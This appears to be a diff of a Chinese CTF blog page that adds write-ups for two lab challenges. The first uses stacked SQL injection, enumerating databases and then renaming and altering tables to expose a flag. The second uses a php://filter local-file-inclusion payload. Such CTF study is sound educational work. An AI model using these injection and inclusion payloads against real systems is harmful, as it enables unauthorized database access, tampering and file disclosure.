@@ -319,7 +319,7 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/27.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/33.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
@@ -478,14 +478,14 @@
                 
                 <div class="info-break-policy">
                     <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    870
+                    1.4k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    3 分
+                    6 分
                 </div>
                 
                 
@@ -579,7 +579,130 @@
 <p>因为source与hint都在whitelist的白名单里面，这里就是类似于将这个题目定向</p>
 <p>没什么东西</p>
 <p>flag{7c4ca688-51e1-4235-958a-fad970c48f7b}</p>
-<h1 id="N1book"><a href="#N1book" class="headerlink" title="N1book"></a>N1book</h1><h2 id="第一章-web入门"><a href="#第一章-web入门" class="headerlink" title="[第一章 web入门]"></a>[第一章 web入门]</h2><h3 id="粗心的小李"><a href="#粗心的小李" class="headerlink" title="粗心的小李"></a>粗心的小李</h3><p>题目：</p>
+<h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>输入1得</p>
+<pre><code>array(2) {
+  [0]=&gt;
+  string(1) &quot;1&quot;
+  [1]=&gt;
+  string(7) &quot;hahahah&quot;
+}</code></pre><p>输入1’</p>
+<pre><code>error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;&#39;1&#39;&#39;&#39; at line 1</code></pre><p>报错了</p>
+<p>输入：1’ or 1=1#</p>
+<pre><code>array(2) {
+  [0]=&gt;
+  string(1) &quot;1&quot;
+  [1]=&gt;
+  string(7) &quot;hahahah&quot;
+}
+
+array(2) {
+  [0]=&gt;
+  string(1) &quot;2&quot;
+  [1]=&gt;
+  string(12) &quot;miaomiaomiao&quot;
+}
+
+array(2) {
+  [0]=&gt;
+  string(6) &quot;114514&quot;
+  [1]=&gt;
+  string(2) &quot;ys&quot;
+}</code></pre><p>爆出一些没有用的数组，但是说明了万能钥匙好用，存在注入点</p>
+<p>输入：1’ union select 1,2#</p>
+<pre><code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></pre><p>这可能是进入了某一步算法中了反正联合查询应该是凉了（全剧终）</p>
+<p>考虑堆叠注入（学到了）：</p>
+<p>原理：在sql语句中以;表示一个语句的结束，如果一个sql语句结束后再接着一个sql语句，就会执行这两条sql语句</p>
+<p>输入：1’;show databases;#</p>
+<pre><code>array(1) {
+  [0]=&gt;
+  string(11) &quot;ctftraining&quot;
+}
+
+array(1) {
+  [0]=&gt;
+  string(18) &quot;information_schema&quot;
+}
+
+array(1) {
+  [0]=&gt;
+  string(5) &quot;mysql&quot;
+}
+
+array(1) {
+  [0]=&gt;
+  string(18) &quot;performance_schema&quot;
+}
+
+array(1) {
+  [0]=&gt;
+  string(9) &quot;supersqli&quot;
+}
+
+array(1) {
+  [0]=&gt;
+  string(4) &quot;test&quot;
+}</code></pre><p>输入：1’;show tables from supersqli;#</p>
+<pre><code>array(1) {
+  [0]=&gt;
+  string(16) &quot;1919810931114514&quot;
+}
+
+array(1) {
+  [0]=&gt;
+  string(5) &quot;words&quot;
+}</code></pre><p>输入：1’;show columns from  <code>1919810931114514</code>;#(字符串为表名操作时要加反引号)``</p>
+<pre><code>array(6) {
+  [0]=&gt;
+  string(4) &quot;flag&quot;
+  [1]=&gt;
+  string(12) &quot;varchar(100)&quot;
+  [2]=&gt;
+  string(2) &quot;NO&quot;
+  [3]=&gt;
+  string(0) &quot;&quot;
+  [4]=&gt;
+  NULL
+  [5]=&gt;
+  string(0) &quot;&quot;
+}</code></pre><p>输入：1’;show columns from words;#</p>
+<pre><code>array(6) {
+  [0]=&gt;
+  string(2) &quot;id&quot;
+  [1]=&gt;
+  string(7) &quot;int(10)&quot;
+  [2]=&gt;
+  string(2) &quot;NO&quot;
+  [3]=&gt;
+  string(0) &quot;&quot;
+  [4]=&gt;
+  NULL
+  [5]=&gt;
+  string(0) &quot;&quot;
+}
+
+array(6) {
+  [0]=&gt;
+  string(4) &quot;data&quot;
+  [1]=&gt;
+  string(11) &quot;varchar(20)&quot;
+  [2]=&gt;
+  string(2) &quot;NO&quot;
+  [3]=&gt;
+  string(0) &quot;&quot;
+  [4]=&gt;
+  NULL
+  [5]=&gt;
+  string(0) &quot;&quot;
+}</code></pre><p>1’;rename tables <code>words</code> to <code>words1</code>;rename tables <code>1919810931114514</code> to <code>words</code>; alter table <code>words</code> change <code>flag</code> <code>id</code> varchar(100);#</p>
+<p>然后1’ or 1=1#</p>
+<h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p>php伪协议</p>
+<p>特点：文件包含，/?file=flag.php</p>
+<p>payload:file=php://filter/read=convert.base64-encode/resource=flag.php</p>
+<p>得：PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7MzEyOTZhNWUtZjRiMy00ZTY1LTg5MGEtOThjNjZhMWU5MWI0fQo=</p>
+<p>base64得：</p>
+<pre><code>&lt;?php
+echo &quot;Can you find out the flag?&quot;;
+//flag{31296a5e-f4b3-4e65-890a-98c66a1e91b4}</code></pre><h1 id="N1book"><a href="#N1book" class="headerlink" title="N1book"></a>N1book</h1><h2 id="第一章-web入门"><a href="#第一章-web入门" class="headerlink" title="[第一章 web入门]"></a>[第一章 web入门]</h2><h3 id="粗心的小李"><a href="#粗心的小李" class="headerlink" title="粗心的小李"></a>粗心的小李</h3><p>题目：</p>
 <p>Git测试</p>
 <p>Hello, CTFer!</p>
 <p>当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当，可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。</p>
@@ -1083,35 +1206,37 @@ python GitHack.py http://24015196-5385-41b6-9b92-02d1bdc92971.node3.buuoj.cn/.gi
             <div class="article-badge left-badge text-color">
                 <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2020/12/23/ctfhub-sui-bi/">
+                <a href="/2020/12/24/python-bi-ji/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/25.jpg" class="responsive-img" alt="CtfHub随笔">
+                        <img src="/medias/featureimages/31.jpg" class="responsive-img" alt="python笔记">
                         
-                        <span class="card-title">CtfHub随笔</span>
+                        <span class="card-title">python笔记</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            WebWeb前置技能HTTP协议请求方式题目：
-
-HTTP Method is GET
-Use CTF**B Method, I will give you flag.
-Hint: If you got 「HTTP Method Not A
+                            1.此处想要输出汉字需要在一开始加一个编码：#coding=utf-8
+2.python最具有特色的就是用缩进来写模块
+3.”””xxx”””这里可以多行print
+4.通过#注释
+5.
+counter = 100#赋值整数型变量
+mile
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-12-23
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-12-24
                         </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/CTF/" class="post-category" target="_blank">
-                                    CTF
+                            <a href="/categories/编程/" class="post-category" target="_blank">
+                                    编程
                                 </a>
                             
                             
@@ -1125,8 +1250,8 @@ Hint: If you got 「HTTP Method Not A
                         <span class="chip bg-color">入门</span>
                     </a>
                     
-                    <a href="/tags/ctfhub/" target="_blank">
-                        <span class="chip bg-color">ctfhub</span>
+                    <a href="/tags/python/" target="_blank">
+                        <span class="chip bg-color">python</span>
                     </a>
                     
                 </div>
@@ -1144,7 +1269,7 @@ Hint: If you got 「HTTP Method Not A
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="lampiao渗透测试初探">
+                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="lampiao渗透测试初探">
                         
                         <span class="card-title">lampiao渗透测试初探</span>
                     </div>
@@ -1355,7 +1480,7 @@ Try this brand new vulnerable machine! &quot;Lampiã
 
             
             &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-            <span class="white-color">29.1k</span>
+            <span class="white-color">28.1k</span>
             
 
             <br>
